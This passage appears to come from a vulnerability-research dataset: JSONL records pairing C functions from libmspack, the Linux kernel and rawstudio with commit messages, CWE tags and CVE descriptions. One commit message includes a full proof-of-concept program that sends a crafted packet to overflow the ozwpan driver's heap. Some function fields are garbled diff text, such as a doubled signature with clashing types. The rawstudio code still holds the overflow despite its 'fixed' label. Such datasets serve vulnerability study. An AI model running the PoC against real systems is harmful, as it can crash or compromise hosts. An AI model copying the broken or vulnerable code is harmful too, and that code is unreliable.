is limited not to wrap a frame, this also means it\n\t * won't wrap the window (as the window is a multiple of 32k) */\n\trundest = &window[window_posn];\n\twindow_posn += this_run;\n\twhile (this_run > 0) {\n\t  if ((i = i_end - i_ptr) == 0) {\n\t    READ_IF_NEEDED;\n\t  }\n\t  else {\n\t    if (i > this_run) i = this_run;\n\t    lzx->sys->copy(i_ptr, rundest, (size_t) i);\n\t    rundest  += i;\n\t    i_ptr    += i;\n\t    this_run -= i;\n\t  }\n\t}\n\tbreak;\n\n      default:\n\treturn lzx->error = MSPACK_ERR_DECRUNCH; /* might as well */\n      }\n\n      /* did the final match overrun our desired this_run length? */\n      if (this_run < 0) {\n\tif ((unsigned int)(-this_run) > lzx->block_remaining) {\n\t  D((\"overrun went past end of block by %d (%d remaining)\",\n\t     -this_run, lzx->block_remaining ))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n\tlzx->block_remaining -= -this_run;\n      }\n    } /* while (bytes_todo > 0) */\n\n    /* streams don't extend over frame boundaries */\n    if ((window_posn - lzx->frame_posn) != frame_size) {\n      D((\"decode beyond output frame limits! %d != %d\",\n\t window_posn - lzx->frame_posn, frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* re-align input bitstream */\n    if (bits_left > 0) ENSURE_BITS(16);\n    if (bits_left & 15) REMOVE_BITS(bits_left & 15);\n\n    /* check that we've used all of the previous frame first */\n    if (lzx->o_ptr != lzx->o_end) {\n      D((\"%ld avail bytes, new %d frame\",\n          (long)(lzx->o_end - lzx->o_ptr), frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* does this intel block _really_ need decoding? */\n    if (lzx->intel_started && lzx->intel_filesize &&\n\t(lzx->frame <= 32768) && (frame_size > 10))\n    {\n      unsigned char *data    = &lzx->e8_buf[0];\n      unsigned char *dataend = &lzx->e8_buf[frame_size - 10];\n      signed int curpos      = lzx->intel_curpos;\n      signed int filesize    = lzx->intel_filesize;\n      signed int abs_off, rel_off;\n\n      /* copy e8 block to the e8 buffer and tweak if needed */\n      lzx->o_ptr = data;\n      lzx->sys->copy(&lzx->window[lzx->frame_posn], data, frame_size);\n\n      while (data < dataend) {\n\tif (*data++ != 0xE8) { curpos++; continue; }\n\tabs_off = data[0] | (data[1]<<8) | (data[2]<<16) | (data[3]<<24);\n\tif ((abs_off >= -curpos) && (abs_off < filesize)) {\n\t  rel_off = (abs_off >= 0) ? abs_off - curpos : abs_off + filesize;\n\t  data[0] = (unsigned char) rel_off;\n\t  data[1] = (unsigned char) (rel_off >> 8);\n\t  data[2] = (unsigned char) (rel_off >> 16);\n\t  data[3] = (unsigned char) (rel_off >> 24);\n\t}\n\tdata += 4;\n\tcurpos += 5;\n      }\n      lzx->intel_curpos += frame_size;\n    }\n    else {\n      lzx->o_ptr = &lzx->window[lzx->frame_posn];\n      if (lzx->intel_filesize) lzx->intel_curpos += frame_size;\n    }\n    lzx->o_end = &lzx->o_ptr[frame_size];\n\n    /* write a frame */\n    i = (out_bytes < (off_t)frame_size) ? (unsigned int)out_bytes : frame_size;\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n\n    /* advance frame start position */\n    lzx->frame_posn += frame_size;\n    lzx->frame++;\n\n    /* wrap window / frame position pointers */\n    if (window_posn == lzx->window_size)     window_posn = 0;\n    if (lzx->frame_posn == lzx->window_size) lzx->frame_posn = 0;\n\n  } /* while (lzx->frame < end_frame) */\n\n  if (out_bytes) {\n    D((\"bytes left to output\"))\n    return lzx->error = MSPACK_ERR_DECRUNCH;\n  }\n\n  /* store local state */\n  STORE_BITS;\n  lzx->window_posn = window_posn;\n  lzx->R0 = R0;\n  lzx->R1 = R1;\n  lzx->R2 = R2;\n\n  return MSPACK_ERR_OK;\n}\n", "func_hash": 38707763100156244328506103789635435471, "file_name": "lzxd.c", "file_hash": 195696769726294100414401643560402095459, "cwe": ["CWE-189"], "cve": "CVE-2015-4471", "cve_desc": "Off-by-one error in the lzxd_decompress function in lzxd.c in libmspack before 0.5 allows remote attackers to cause a denial of service (buffer under-read and application crash) via a crafted CAB archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4471"}
{"idx": 159180, "project": "linux", "commit_id": "23b133bdc452aa441fcb9b82cbf6dd05cfd342d0", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/23b133bdc452aa441fcb9b82cbf6dd05cfd342d0", "commit_message": "udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when\nloading inodes from disk. Otherwise corrupted filesystems could confuse\nthe code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>", "target": 0, "func": "static int udf_read_inode(struct inode *inode, bool hidden_inode)\n{\n\tstruct buffer_head *bh = NULL;\n\tstruct fileEntry *fe;\n\tstruct extendedFileEntry *efe;\n\tuint16_t ident;\n\tstruct udf_inode_info *iinfo = UDF_I(inode);\n\tstruct udf_sb_info *sbi = UDF_SB(inode->i_sb);\n\tstruct kernel_lb_addr *iloc = &iinfo->i_location;\n\tunsigned int link_count;\n\tunsigned int indirections = 0;\n\tint bs = inode->i_sb->s_blocksize;\n\tint ret = -EIO;\n\nreread:\n\tif (iloc->logicalBlockNum >=\n\t    sbi->s_partmaps[iloc->partitionReferenceNum].s_partition_len) {\n\t\tudf_debug(\"block=%d, partition=%d out of range\\n\",\n\t\t\t  iloc->logicalBlockNum, iloc->partitionReferenceNum);\n\t\treturn -EIO;\n\t}\n\n\t/*\n\t * Set defaults, but the inode is still incomplete!\n\t * Note: get_new_inode() sets the following on a new inode:\n\t *      i_sb = sb\n\t *      i_no = ino\n\t *      i_flags = sb->s_flags\n\t *      i_state = 0\n\t * clean_inode(): zero fills and sets\n\t *      i_count = 1\n\t *      i_nlink = 1\n\t *      i_op = NULL;\n\t */\n\tbh = udf_read_ptagged(inode->i_sb, iloc, 0, &ident);\n\tif (!bh) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed !bh\\n\", inode->i_ino);\n\t\treturn -EIO;\n\t}\n\n\tif (ident != TAG_IDENT_FE && ident != TAG_IDENT_EFE &&\n\t    ident != TAG_IDENT_USE) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed ident=%d\\n\",\n\t\t\tinode->i_ino, ident);\n\t\tgoto out;\n\t}\n\n\tfe = (struct fileEntry *)bh->b_data;\n\tefe = (struct extendedFileEntry *)bh->b_data;\n\n\tif (fe->icbTag.strategyType == cpu_to_le16(4096)) {\n\t\tstruct buffer_head *ibh;\n\n\t\tibh = udf_read_ptagged(inode->i_sb, iloc, 1, &ident);\n\t\tif (ident == TAG_IDENT_IE && ibh) {\n\t\t\tstruct kernel_lb_addr loc;\n\t\t\tstruct indirectEntry *ie;\n\n\t\t\tie = (struct indirectEntry *)ibh->b_data;\n\t\t\tloc = lelb_to_cpu(ie->indirectICB.extLocation);\n\n\t\t\tif (ie->indirectICB.extLength) {\n\t\t\t\tbrelse(ibh);\n\t\t\t\tmemcpy(&iinfo->i_location, &loc,\n\t\t\t\t       sizeof(struct kernel_lb_addr));\n\t\t\t\tif (++indirections > UDF_MAX_ICB_NESTING) {\n\t\t\t\t\tudf_err(inode->i_sb,\n\t\t\t\t\t\t\"too many ICBs in ICB hierarchy\"\n\t\t\t\t\t\t\" (max %d supported)\\n\",\n\t\t\t\t\t\tUDF_MAX_ICB_NESTING);\n\t\t\t\t\tgoto out;\n\t\t\t\t}\n\t\t\t\tbrelse(bh);\n\t\t\t\tgoto reread;\n\t\t\t}\n\t\t}\n\t\tbrelse(ibh);\n\t} else if (fe->icbTag.strategyType != cpu_to_le16(4)) {\n\t\tudf_err(inode->i_sb, \"unsupported strategy type: %d\\n\",\n\t\t\tle16_to_cpu(fe->icbTag.strategyType));\n\t\tgoto out;\n\t}\n\tif (fe->icbTag.strategyType == cpu_to_le16(4))\n\t\tiinfo->i_strat4096 = 0;\n\telse /* if (fe->icbTag.strategyType == cpu_to_le16(4096)) */\n\t\tiinfo->i_strat4096 = 1;\n\n\tiinfo->i_alloc_type = le16_to_cpu(fe->icbTag.flags) &\n\t\t\t\t\t\t\tICBTAG_FLAG_AD_MASK;\n\tiinfo->i_unique = 0;\n\tiinfo->i_lenEAttr = 0;\n\tiinfo->i_lenExtents = 0;\n\tiinfo->i_lenAlloc = 0;\n\tiinfo->i_next_alloc_block = 0;\n\tiinfo->i_next_alloc_goal = 0;\n\tif (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_EFE)) {\n\t\tiinfo->i_efe = 1;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct extendedFileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct extendedFileEntry),\n\t\t       bs - sizeof(struct extendedFileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_FE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs - sizeof(struct fileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct fileEntry),\n\t\t       bs - sizeof(struct fileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_USE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 1;\n\t\tiinfo->i_lenAlloc = le32_to_cpu(\n\t\t\t\t((struct unallocSpaceEntry *)bh->b_data)->\n\t\t\t\t lengthAllocDescs);\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct unallocSpaceEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct unallocSpaceEntry),\n\t\t       bs - sizeof(struct unallocSpaceEntry));\n\t\treturn 0;\n\t}\n\n\tret = -EIO;\n\tread_lock(&sbi->s_cred_lock);\n\ti_uid_write(inode, le32_to_cpu(fe->uid));\n\tif (!uid_valid(inode->i_uid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_SET))\n\t\tinode->i_uid = UDF_SB(inode->i_sb)->s_uid;\n\n\ti_gid_write(inode, le32_to_cpu(fe->gid));\n\tif (!gid_valid(inode->i_gid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_SET))\n\t\tinode->i_gid = UDF_SB(inode->i_sb)->s_gid;\n\n\tif (fe->icbTag.fileType != ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_fmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_fmode;\n\telse if (fe->icbTag.fileType == ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_dmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_dmode;\n\telse\n\t\tinode->i_mode = udf_convert_permissions(fe);\n\tinode->i_mode &= ~sbi->s_umask;\n\tread_unlock(&sbi->s_cred_lock);\n\n\tlink_count = le16_to_cpu(fe->fileLinkCount);\n\tif (!link_count) {\n\t\tif (!hidden_inode) {\n\t\t\tret = -ESTALE;\n\t\t\tgoto out;\n\t\t}\n\t\tlink_count = 1;\n\t}\n\tset_nlink(inode, link_count);\n\n\tinode->i_size = le64_to_cpu(fe->informationLength);\n\tiinfo->i_lenExtents = inode->i_size;\n\n\tif (iinfo->i_efe == 0) {\n\t\tinode->i_blocks = le64_to_cpu(fe->logicalBlocksRecorded) <<\n\t\t\t(inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, fe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    fe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, fe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(fe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(fe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(fe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(fe->checkpoint);\n\t} else {\n\t\tinode->i_blocks = le64_to_cpu(efe->logicalBlocksRecorded) <<\n\t\t    (inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, efe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    efe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&iinfo->i_crtime, efe->createTime))\n\t\t\tiinfo->i_crtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, efe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(efe->uniqueID);\n\t\tiinfo->i_lenEAttr = le32_to_cpu(efe->lengthExtendedAttr);\n\t\tiinfo->i_lenAlloc = le32_to_cpu(efe->lengthAllocDescs);\n\t\tiinfo->i_checkpoint = le32_to_cpu(efe->checkpoint);\n \t}\n \tinode->i_generation = iinfo->i_unique;\n \n\t/*\n\t * Sanity check length of allocation descriptors and extended attrs to\n\t * avoid integer overflows\n\t */\n\tif (iinfo->i_lenEAttr > bs || iinfo->i_lenAlloc > bs)\n\t\tgoto out;\n\t/* Now do exact checks */\n\tif (udf_file_entry_alloc_offset(inode) + iinfo->i_lenAlloc > bs)\n\t\tgoto out;\n \t/* Sanity checks for files in ICB so that we don't get confused later */\n \tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {\n \t\t/*\n\t\t * For file in ICB data is stored in allocation descriptor\n\t\t * so sizes should match\n\t\t */\n\t\tif (iinfo->i_lenAlloc != inode->i_size)\n\t\t\tgoto out;\n\t\t/* File in ICB has to fit in there... */\n\t\tif (inode->i_size > bs - udf_file_entry_alloc_offset(inode))\n\t\t\tgoto out;\n\t}\n\n\tswitch (fe->icbTag.fileType) {\n\tcase ICBTAG_FILE_TYPE_DIRECTORY:\n\t\tinode->i_op = &udf_dir_inode_operations;\n\t\tinode->i_fop = &udf_dir_operations;\n\t\tinode->i_mode |= S_IFDIR;\n\t\tinc_nlink(inode);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_REALTIME:\n\tcase ICBTAG_FILE_TYPE_REGULAR:\n\tcase ICBTAG_FILE_TYPE_UNDEF:\n\tcase ICBTAG_FILE_TYPE_VAT20:\n\t\tif (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB)\n\t\t\tinode->i_data.a_ops = &udf_adinicb_aops;\n\t\telse\n\t\t\tinode->i_data.a_ops = &udf_aops;\n\t\tinode->i_op = &udf_file_inode_operations;\n\t\tinode->i_fop = &udf_file_operations;\n\t\tinode->i_mode |= S_IFREG;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BLOCK:\n\t\tinode->i_mode |= S_IFBLK;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_CHAR:\n\t\tinode->i_mode |= S_IFCHR;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_FIFO:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFIFO, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SOCKET:\n\t\tinit_special_inode(inode, inode->i_mode | S_IFSOCK, 0);\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_SYMLINK:\n\t\tinode->i_data.a_ops = &udf_symlink_aops;\n\t\tinode->i_op = &udf_symlink_inode_operations;\n\t\tinode->i_mode = S_IFLNK | S_IRWXUGO;\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MAIN:\n\t\tudf_debug(\"METADATA FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_MIRROR:\n\t\tudf_debug(\"METADATA MIRROR FILE-----\\n\");\n\t\tbreak;\n\tcase ICBTAG_FILE_TYPE_BITMAP:\n\t\tudf_debug(\"METADATA BITMAP FILE-----\\n\");\n\t\tbreak;\n\tdefault:\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed unknown file type=%d\\n\",\n\t\t\tinode->i_ino, fe->icbTag.fileType);\n\t\tgoto out;\n\t}\n\tif (S_ISCHR(inode->i_mode) || S_ISBLK(inode->i_mode)) {\n\t\tstruct deviceSpec *dsea =\n\t\t\t(struct deviceSpec *)udf_get_extendedattr(inode, 12, 1);\n\t\tif (dsea) {\n\t\t\tinit_special_inode(inode, inode->i_mode,\n\t\t\t\tMKDEV(le32_to_cpu(dsea->majorDeviceIdent),\n\t\t\t\t      le32_to_cpu(dsea->minorDeviceIdent)));\n\t\t\t/* Developer ID ??? */\n\t\t} else\n\t\t\tgoto out;\n\t}\n\tret = 0;\nout:\n\tbrelse(bh);\n\treturn ret;\n}\n", "func_hash": 268421128721178182080104238233138561370, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-4167", "cve_desc": "The udf_read_inode function in fs/udf/inode.c in the Linux kernel before 3.19.1 does not validate certain length values, which allows local users to cause a denial of service (incorrect data representation or integer overflow, and OOPS) via a crafted UDF filesystem.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4167"}
{"idx": 159182, "project": "linux", "commit_id": "b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c", "commit_message": "ozwpan: Use unsigned ints to prevent heap overflow\n\nUsing signed integers, the subtraction between required_size and offset\ncould wind up being negative, resulting in a memcpy into a heap buffer\nwith a negative length, resulting in huge amounts of network-supplied\ndata being copied into the heap, which could potentially lead to remote\ncode execution.. This is remotely triggerable with a magic packet.\nA PoC which obtains DoS follows below. It requires the ozprotocol.h file\nfrom this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>\n #include <linux/if_packet.h>\n #include <net/if.h>\n #include <netinet/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys/ioctl.h>\n #include <sys/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t} __packed connect_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 35,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t}\n\t};\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_get_desc_rsp oz_get_desc_rsp;\n\t} __packed pwn_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(1)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_get_desc_rsp)\n\t\t},\n\t\t.oz_get_desc_rsp = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_GET_DESC_RSP,\n\t\t\t.req_id = 0,\n\t\t\t.offset = htole16(2),\n\t\t\t.total_size = htole16(1),\n\t\t\t.rcode = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\tusleep(300000);\n\tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 0, "func": "void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,\nvoid oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,\n\t\t\tu8 length, u16 offset, u16 total_size)\n {\n \tstruct oz_port *port = hport;\n \tstruct urb *urb;\n\tint err = 0;\n\n\toz_dbg(ON, \"oz_hcd_get_desc_cnf length = %d offs = %d tot_size = %d\\n\",\n\t       length, offset, total_size);\n\turb = oz_find_urb_by_id(port, 0, req_id);\n \tif (!urb)\n \t\treturn;\n \tif (status == 0) {\n\t\tunsigned int copy_len;\n\t\tunsigned int required_size = urb->transfer_buffer_length;\n \n \t\tif (required_size > total_size)\n \t\t\trequired_size = total_size;\n\t\tcopy_len = required_size-offset;\n\t\tif (length <= copy_len)\n\t\t\tcopy_len = length;\n\t\tmemcpy(urb->transfer_buffer+offset, desc, copy_len);\n\t\toffset += copy_len;\n\t\tif (offset < required_size) {\n\t\t\tstruct usb_ctrlrequest *setup =\n\t\t\t\t(struct usb_ctrlrequest *)urb->setup_packet;\n\t\t\tunsigned wvalue = le16_to_cpu(setup->wValue);\n\n\t\t\tif (oz_enqueue_ep_urb(port, 0, 0, urb, req_id))\n\t\t\t\terr = -ENOMEM;\n\t\t\telse if (oz_usb_get_desc_req(port->hpd, req_id,\n\t\t\t\t\tsetup->bRequestType, (u8)(wvalue>>8),\n\t\t\t\t\t(u8)wvalue, setup->wIndex, offset,\n\t\t\t\t\trequired_size-offset)) {\n\t\t\t\toz_dequeue_ep_urb(port, 0, 0, urb);\n\t\t\t\terr = -ENOMEM;\n\t\t\t}\n\t\t\tif (err == 0)\n\t\t\t\treturn;\n\t\t}\n\t}\n\turb->actual_length = total_size;\n\toz_complete_urb(port->ozhcd->hcd, urb, 0);\n}\n", "func_hash": 338033345113830542985584316307589461928, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-4001", "cve_desc": "Integer signedness error in the oz_hcd_get_desc_cnf function in drivers/staging/ozwpan/ozhcd.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4001"}
{"idx": 159185, "project": "rawstudio", "commit_id": "983bda1f0fa5fa86884381208274198a620f006e", "project_url": "https://github.com/rawstudio/rawstudio", "commit_url": "https://github.com/rawstudio/rawstudio/commit/983bda1f0fa5fa86884381208274198a620f006e", "commit_message": "Avoid overflow in ljpeg_start().", "target": 0, "func": " int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n  int c, tag;\n  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n \n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}\n", "func_hash": 288581977157350259504025671296085886, "file_name": "dcraw.cc", "file_hash": 257159519755338469216428419271245748021, "cwe": ["CWE-189"], "cve": "CVE-2015-3885", "cve_desc": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3885"}
